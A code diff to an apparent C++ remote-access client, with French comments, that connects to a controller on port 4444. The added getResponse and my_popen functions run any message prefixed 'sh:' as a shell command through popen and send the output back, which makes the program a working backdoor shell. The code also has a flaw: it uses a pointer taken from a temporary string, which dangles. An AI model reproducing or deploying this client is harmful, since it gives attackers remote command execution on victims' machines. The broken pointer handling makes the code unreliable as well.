@@ -7,33 +7,7 @@
 *
 */
 	
-// if we're on windows
-#if defined (WIN32)
-	#include <windows.h>
- 
-    #include <winsock2.h>
-	#pragma comment(lib, "ws2_32.lib")
-   typedef int socklen_t;
-
-// else, if we're on Linux
-#elif defined (linux)
-
-	#include <sys/types.h>
-	#include <sys/socket.h>
-	#include <arpa/inet.h>
-	#include <unistd.h>
-
-#endif
-
-#include <iostream>
-#include <cstdio>
-#include <cstdlib>
-#include <cstring>
-#include <string>
-
-#define PORT 4444
-#define BUFSIZE 256
-#define IP "127.0.0.1"
+#include "client.hpp"
 
 using namespace std;
 
@@ -47,7 +21,7 @@ int main(int argc, char const *argv[])
     #endif
 
 
-	int sock,len,val;
+	int sock,val;
 	char buffer[BUFSIZE];
 	struct sockaddr_in server_address;
 	bool isConnected = true;
@@ -75,7 +49,7 @@ int main(int argc, char const *argv[])
 				Sleep(20000);
 			// else, if we're on Linux
 			#elif defined (linux)
-				sleep(2);
+				sleep(20);
 			#endif
 		}
 		cout<<"Connecté au serveur !"<<endl;
@@ -97,13 +71,15 @@ int main(int argc, char const *argv[])
 	        cout<<"recu :"<<buffer<<endl;
 	        if(val>0)
 	        {
-		        string result = "I'M ROOT";
-		        len = result.size();
-		        if(send(sock,result.c_str(),len,0)!=len)
+	        	string buf(buffer);
+		       	string rep(getResponse(buf,sock));
+		       	int size = rep.size();
+		        if(send(sock,rep.c_str(),size,0)!=size)
 		        {
-		            perror("send");
+		        	perror("send");
 		        }
-	    	}else if(val<=0)
+
+		   	}else if(val<=0)
 	    	{
 	    		close(sock);
 	    		isConnected=false;
@@ -111,4 +87,41 @@ int main(int argc, char const *argv[])
 	    }
 	}
 	return 0;
+}
+
+string getResponse(string buffer,int sock)
+{
+	string delimiter = ":";
+	string prefix = buffer.substr(0,buffer.find(delimiter));
+	char* command = (char*)(buffer.substr(buffer.find(delimiter)+1	,buffer.size()-1)).c_str();
+	string mystring;
+	if(prefix=="sh")
+	{	 	
+		FILE* myfile ;
+        my_popen(command,mystring);
+		if(mystring.size()==0)
+		{
+			mystring= "Commande non verbeuse";
+		}    
+	    return mystring;
+            
+	}
+	return "error";
+
+}
+bool my_popen (const std::string& cmd,std::string& out ) {
+    bool            ret_boolValue = true;
+    FILE*           fp;
+    const int       SIZEBUF = 1234;
+    char            buf [SIZEBUF];
+    
+    if ((fp = popen(cmd.c_str (), "r")) == NULL) {
+        return false;
+    }
+    std::string  cur_string = "";
+    while (fgets(buf, sizeof (buf), fp)) {
+        out += buf;
+    }
+    pclose(fp);
+    return true;
 }
